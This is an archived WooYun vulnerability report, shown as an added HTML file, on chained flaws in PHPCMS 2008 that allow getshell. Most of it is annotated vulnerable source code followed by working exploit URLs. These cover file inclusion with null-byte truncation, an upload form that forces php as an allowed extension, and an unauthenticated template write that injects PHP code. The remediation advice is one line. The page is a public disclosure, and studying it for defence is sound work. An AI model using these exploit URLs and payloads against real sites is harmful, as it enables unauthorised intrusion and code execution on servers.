@@ -1,0 +1,367 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		phpcms 2008多个漏洞 (可getshell)  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		phpcms 2008多个漏洞 (可getshell)  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/b4dboy">b4dboy</a> 
+</li><li>提交时间：		2012-07-12 19:03</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-07-12：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-07-17：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">一个漏洞不可怕，可怕的是一连串的漏洞，拼接起来就可以getshell了。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail"></p><pre><code>###文件包含<br />
+&lt;?php<br />
+define(&#039;IN_YP&#039;, TRUE);<br />
+define(&#039;ADMIN_ROOT&#039;, str_replace(&quot;\\&quot;, &#039;/&#039;,dirname(__FILE__)).&#039;/&#039;);<br />
+require &#039;../include/common.inc.php&#039;;<br />
+<br />
+## 要登陆<br />
+if(!$_userid) showmessage(&#039;您还没有登陆，即将跳转到登陆页面&#039;,$MODULE[&#039;member&#039;][&#039;url&#039;].&#039;login.php?forward=&#039;.urlencode(URL));<br />
+session_start();<br />
+<br />
+## $file变量可控制<br />
+if(!isset($file) || empty($file)) $file = &#039;panel&#039;;<br />
+<br />
+/* $company_user_infos 获取企业会员信息 */<br />
+$company_user_infos = $db-&gt;get_one(&quot;SELECT * FROM `&quot;.DB_PRE.&quot;member_company` WHERE `userid`=&#039;$_userid&#039;&quot;);<br />
+$userid = $_userid;<br />
+<br />
+## 注册的时候选择企业用户<br />
+if(!$company_user_infos)<br />
+{<br />
+	$MS[&#039;title&#039;] = &#039;您不是企业会员&#039;;<br />
+	$MS[&#039;description&#039;] = &#039;你可以做下面操作&#039;;<br />
+	$MS[&#039;urls&#039;][0] = array(<br />
+		&#039;name&#039;=&gt;&#039;免费升级为企业会员&#039;,<br />
+		&#039;url&#039;=&gt;$PHPCMS[&#039;siteurl&#039;].$M[&#039;url&#039;].&#039;company.php?action=member&#039;,<br />
+		);<br />
+	$MS[&#039;urls&#039;][1] = array(<br />
+		&#039;name&#039;=&gt;&#039;退出当前帐号，换其他帐号登陆&#039;,<br />
+		&#039;url&#039;=&gt;$PHPCMS[&#039;siteurl&#039;].&#039;member/logout.php&#039;,<br />
+		);<br />
+	$MS[&#039;urls&#039;][2] = array(<br />
+		&#039;name&#039;=&gt;&#039;重新注册为企业会员&#039;,<br />
+		&#039;url&#039;=&gt;$PHPCMS[&#039;siteurl&#039;].&#039;member/logout.php?forward=&#039;.urlencode($PHPCMS[&#039;siteurl&#039;].&#039;member/register.php&#039;),<br />
+		);<br />
+	msg($MS);<br />
+}<br />
+$CATEGORY = subcat(&#039;yp&#039;);<br />
+$siteurl = company_url($userid, $company_user_infos[&#039;sitedomain&#039;]);<br />
+<br />
+$_SESSION[&#039;url&#039;] = QUERY_STRING;<br />
+<br />
+if($file != &#039;company&#039; &amp;&amp; $M[&#039;enableSecondDomain&#039;] &amp;&amp; !$company_user_infos[&#039;sitedomain&#039;]) showmessage(&#039;请先绑定您的二级域名&#039;,BUSINESSDIR.&#039;?file=company&#039;);<br />
+<br />
+check_priv($file);<br />
+$GROUP = cache_read(&#039;member_group.php&#039;);<br />
+<br />
+## 此处直接包含了，注意$file是可以控制的但须要截断<br />
+if(!@include ADMIN_ROOT.$file.&#039;.inc.php&#039;) showmessage(&#039;The file ./yp/&#039;.$file.&#039;.inc.php is not exists!&#039;);<br />
+<br />
+function check_priv($file)<br />
+{<br />
+	global $M,$PHPCMS,$_groupid;<br />
+	if(!$M[&quot;allow_add_$file&quot;]) return true;<br />
+	if(!in_array($_groupid,$M[&quot;allow_add_$file&quot;]))<br />
+	{<br />
+		$MS[&#039;title&#039;] = &#039;您所在的会员组没有此项操作权限&#039;;<br />
+		$MS[&#039;description&#039;] = &#039;你可以做下面操作&#039;;<br />
+		$MS[&#039;urls&#039;][0] = array(<br />
+			&#039;name&#039;=&gt;&#039;升级会员组&#039;,<br />
+			&#039;url&#039;=&gt;$PHPCMS[&#039;siteurl&#039;].&#039;member/upgrade.php&#039;,<br />
+			);<br />
+		$MS[&#039;urls&#039;][1] = array(<br />
+			&#039;name&#039;=&gt;&#039;返回商务中心&#039;,<br />
+			&#039;url&#039;=&gt;&#039;?&#039;,<br />
+			);<br />
+		msg($MS);	<br />
+	}<br />
+}<br />
+?&gt;<br />
+## 利用注册一个企业用户<br />
+EXP:http://localhost/phpcms/yp/business/?file=../../xxoo.txt%00.<br />
+由于涉及截断，所以鸡肋了，哥是要去拿shell的。<br />
+<br />
+<br />
+## 再看这一句<br />
+if(!@include ADMIN_ROOT.$file.&#039;.inc.php&#039;) showmessage(&#039;The file ./yp/&#039;.$file.&#039;.inc.php is not exists!&#039;);<br />
+以.inc.php结尾的文件有大把随便找个有漏的文件包含进来，不就能二次利用了？<br />
+<br />
+<br />
+<br />
+## 首先进入视线的是/admin/upload.inc.php 看名字就知道如果能利用的话，将会.....(省略500字)<br />
+&lt;?php <br />
+defined(&#039;IN_PHPCMS&#039;) or exit(&#039;Access Denied&#039;);<br />
+<br />
+require_once &#039;attachment.class.php&#039;;<br />
+<br />
+$attachment = new attachment($mod);<br />
+if($catid)<br />
+{<br />
+	$C = cache_read(&#039;category_&#039;.$catid.&#039;.php&#039;);<br />
+}<br />
+## 允许上传的后缀是从$C里取的，变量$C要通过上面那个判断才能赋值，典型的变量未初始化<br />
+$upload_allowext = $C[&#039;upload_allowext&#039;] ? $C[&#039;upload_allowext&#039;] : UPLOAD_ALLOWEXT;<br />
+$upload_maxsize = $C[&#039;upload_maxsize&#039;] ? $C[&#039;upload_maxsize&#039;] : UPLOAD_MAXSIZE;<br />
+if($dosubmit)<br />
+{<br />
+	$attachment-&gt;upload(&#039;uploadfile&#039;, $upload_allowext, $upload_maxsize, 1);<br />
+	if($attachment-&gt;error) showmessage($attachment-&gt;error());<br />
+	//判断是否开启附件ftp上传，返回图片路径<br />
+	$imgurl = UPLOAD_FTP_ENABLE ? $attachment-&gt;uploadedfiles[0][&#039;filepath&#039;] : UPLOAD_URL.$attachment-&gt;uploadedfiles[0][&#039;filepath&#039;];	<br />
+	$aid = $attachment-&gt;uploadedfiles[0][&#039;aid&#039;];<br />
+	$filesize = $attachment-&gt;uploadedfiles[0][&#039;filesize&#039;];<br />
+	$filesize = $attachment-&gt;size($filesize);<br />
+    if($isthumb || $iswatermark)<br />
+	{<br />
+		require_once &#039;image.class.php&#039;;<br />
+		$image = new image();<br />
+		$img = UPLOAD_ROOT.$attachment-&gt;uploadedfiles[0][&#039;filepath&#039;];<br />
+		if($isthumb)<br />
+		{<br />
+			$image-&gt;thumb($img, $img, $width, $height);<br />
+		}<br />
+		if($iswatermark)<br />
+		{<br />
+			$image-&gt;watermark($img, $img, $PHPCMS[&#039;watermark_pos&#039;], $PHPCMS[&#039;watermark_img&#039;], &#039;&#039;, 5, &#039;#ff0000&#039;, $PHPCMS[&#039;watermark_jpgquality&#039;]);<br />
+		}<br />
+	}<br />
+<br />
+	showmessage(&quot;文件上传成功！&lt;script language=&#039;javascript&#039;&gt;	try{ $(window.opener.document).find(\&quot;form[@name=&#039;myform&#039;] #$uploadtext\&quot;).val(\&quot;$imgurl\&quot;);$(window.opener.document).find(\&quot;form[@name=&#039;myform&#039;] #{$uploadtext}_aid\&quot;).val(\&quot;$aid\&quot;);$(window.opener.document).find(\&quot;form[@name=&#039;myform&#039;] #$filesize\&quot;).val(\&quot;$filesize\&quot;);}catch(e){} window.close();&lt;/script&gt;&quot;, HTTP_REFERER);<br />
+}<br />
+else<br />
+{<br />
+	include admin_tpl(&#039;upload&#039;);<br />
+}<br />
+?&gt;<br />
+<br />
+## 没什么好说的看EXP, 上传后查看网页源代码即可找到上传路径.<br />
+&lt;form id=&quot;frmUpload&quot; enctype=&quot;multipart/form-data&quot;<br />
+action=&quot;http://localhost/phpcms/yp/business/?file=../../admin/upload&amp;C[upload_allowext]=php|Php%00.|php%00&amp;dosubmit=yes&quot; method=&quot;post&quot;&gt;<br />
+&lt;h1&gt;Upload a new file:&lt;/h1&gt;<br />
+&lt;input type=&quot;file&quot; name=&quot;uploadfile&quot; size=&quot;50&quot;&gt;&lt;br&gt;<br />
+&lt;input id=&quot;btnUpload&quot; type=&quot;submit&quot; value=&quot;Upload&quot;&gt;<br />
+&lt;/form&gt;<br />
+## 传完后我才发现attachment.class.php 里有黑名单，怎么绕大家结合环境利用吧。<br />
+<br />
+<br />
+## 漏洞再一次被鸡肋化了，哥继续找。 再次进入视线的是block.inc.php，看名字貌似是跟模块有关的，难不成可以写个shell ?<br />
+## 猫了个咪，打开文件我就想骂人了，做为admin目录下的文件，没有任何权限判断。<br />
+## 看144行左右，当$action 等于 post时。<br />
+case &#039;post&#039;:<br />
+	require_once &#039;template.func.php&#039;;<br />
+	if($func == &#039;dosave&#039;) ## 这里完全不用管他，让他进入else<br />
+	{<br />
+		$block-&gt;set_template($blockid, $template);<br />
+		$block-&gt;update($blockid, $data);<br />
+		$data = $block-&gt;get_html($blockid);<br />
+	}<br />
+	else<br />
+	{<br />
+		$name = new_stripslashes($name);<br />
+		$data = new_stripslashes($data);<br />
+		$data = $block-&gt;strip_data($data);<br />
+		$template = new_stripslashes($template);<br />
+		$tpldata = template_parse($template);<br />
+		$tplfile = TPL_CACHEPATH.&#039;block_&#039;.$blockid.&#039;.preview.php&#039;; 	## 文件名<br />
+		file_put_contents($tplfile, $tpldata); 						## 生成文件<br />
+		include $tplfile; 											## 包含文件<br />
+		@unlink($tplfile); 											## 删除刚才生成的文件<br />
+		$data = ob_get_contents();<br />
+		ob_clean();<br />
+	}<br />
+	echo &#039;&lt;script language=&quot;JavaScript&quot;&gt;parent.&#039;.$func.&#039;(&#039;.$blockid.&#039;, &quot;&#039;.format_js($data, 0).&#039;&quot;);&lt;/script&gt;&#039;;<br />
+	break;<br />
+<br />
+## 在这里可以生成一个php文件，并马上包含进来，随后又删除了。由于包含进来了，只要能控制php文件的内容，代码还是会被执行。<br />
+## 看取得文件内容的这一行，$tpldata = template_parse($template); 跟进template_parse函数<br />
+function template_parse($str, $istag = 0)<br />
+{<br />
+	$str = preg_replace(&quot;/([\n\r]+)\t+/s&quot;,&quot;\\1&quot;,$str);<br />
+	$str = preg_replace(&quot;/\&lt;\!\-\-\{(.+?)\}\-\-\&gt;/s&quot;, &quot;{\\1}&quot;,$str);<br />
+	$str = preg_replace(&quot;/\{template\s+(.+)\}/&quot;,&quot;&lt;?php include template(\\1); ?&gt;&quot;,$str);<br />
+	$str = preg_replace(&quot;/\{include\s+(.+)\}/&quot;,&quot;&lt;?php include \\1; ?&gt;&quot;,$str);<br />
+	$str = preg_replace(&quot;/\{php\s+(.+)\}/&quot;,&quot;&lt;?php \\1?&gt;&quot;,$str);<br />
+	$str = preg_replace(&quot;/\{if\s+(.+?)\}/&quot;,&quot;&lt;?php if(\\1) { ?&gt;&quot;,$str);<br />
+	$str = preg_replace(&quot;/\{else\}/&quot;,&quot;&lt;?php } else { ?&gt;&quot;,$str);<br />
+	$str = preg_replace(&quot;/\{elseif\s+(.+?)\}/&quot;,&quot;&lt;?php } elseif (\\1) { ?&gt;&quot;,$str);<br />
+	$str = preg_replace(&quot;/\{\/if\}/&quot;,&quot;&lt;?php } ?&gt;&quot;,$str);<br />
+	$str = preg_replace(&quot;/\{loop\s+(\S+)\s+(\S+)\}/&quot;,&quot;&lt;?php if(is_array(\\1)) foreach(\\1 AS \\2) { ?&gt;&quot;,$str);<br />
+	$str = preg_replace(&quot;/\{loop\s+(\S+)\s+(\S+)\s+(\S+)\}/&quot;,&quot;&lt;?php if(is_array(\\1)) foreach(\\1 AS \\2 =&gt; \\3) { ?&gt;&quot;,$str);<br />
+	$str = preg_replace(&quot;/\{\/loop\}/&quot;,&quot;&lt;?php } ?&gt;&quot;,$str);<br />
+	$str = preg_replace(&quot;/\{\/get\}/&quot;,&quot;&lt;?php } unset(\$DATA); ?&gt;&quot;,$str);<br />
+	$str = preg_replace(&quot;/\{tag_([^}]+)\}/e&quot;, &quot;get_tag(&#039;\\1&#039;)&quot;, $str);<br />
+	$str = preg_replace(&quot;/\{get\s+([^}]+)\}/e&quot;, &quot;get_parse(&#039;\\1&#039;)&quot;, $str);<br />
+	$str = preg_replace(&quot;/\{([a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff:]*\(([^{}]*)\))\}/&quot;,&quot;&lt;?php echo \\1;?&gt;&quot;,$str);<br />
+	$str = preg_replace(&quot;/\{\\$([a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff:]*\(([^{}]*)\))\}/&quot;,&quot;&lt;?php echo \\1;?&gt;&quot;,$str);<br />
+	$str = preg_replace(&quot;/\{(\\$[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*)\}/&quot;,&quot;&lt;?php echo \\1;?&gt;&quot;,$str);<br />
+	$str = preg_replace(&quot;/\{(\\$[a-zA-Z0-9_\[\]\&#039;\&quot;\$\x7f-\xff]+)\}/es&quot;, &quot;addquote(&#039;&lt;?php echo \\1;?&gt;&#039;)&quot;,$str);<br />
+	$str = preg_replace(&quot;/\{([A-Z_\x7f-\xff][A-Z0-9_\x7f-\xff]*)\}/s&quot;, &quot;&lt;?php echo \\1;?&gt;&quot;,$str);<br />
+	if(!$istag) $str = &quot;&lt;?php defined(&#039;IN_PHPCMS&#039;) or exit(&#039;Access Denied&#039;); ?&gt;&quot;.$str;<br />
+	return $str;<br />
+}<br />
+<br />
+## 是用来处理一些模板语法，完全不用理会。<br />
+EXP:http://localhost/yp/business/?file=../../admin/block&amp;action=post&amp;blockid=eval&amp;template=&lt;?php phpinfo();exit();?&gt;</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/121843118d293f0c35d7a753c5569f0f477e0871.jpg" target="_blank"><img src="../images/121843118d293f0c35d7a753c5569f0f477e0871.jpg" alt="" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">判断要严谨，多个地方缺少判断，判断应该用白名单而不是黑名单，黑名单你控制不来的。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+Ps:换个马甲不知道人品会不会好一点，求邀请码。<br />
+<br />
+ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/b4dboy" title="b4dboy">b4dboy</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-09563" title="phpcms 2008多个漏洞 (可getshell)">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2012-07-12 19:03</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+													<p class="detail">漏洞Rank：17 (WooYun评价)</p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="9563";
+var bugRating="2";
+var myRating="";
+var ratingCount="7";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
